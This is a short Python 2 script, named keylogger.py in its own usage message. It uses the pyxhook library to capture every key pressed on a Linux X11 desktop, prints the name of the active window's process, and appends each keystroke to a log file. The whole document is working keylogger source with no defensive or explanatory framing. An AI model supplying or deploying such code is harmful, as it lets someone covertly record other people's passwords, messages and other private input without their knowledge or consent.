import pyxhook
import sys

if (len(sys.argv) < 2):
        print "Correct usage is: python keylogger.py [logfile path]"
        sys.exit(1)
log = sys.argv[1]

def logkey(event):
	#print event.Window
	#print event.WindowName
	print event.WindowProcName
	f=open(log,'a')
	f.write(event.Key)

hook = pyxhook.HookManager()
hook.KeyDown=logkey
hook.HookKeyboard()
hook.start()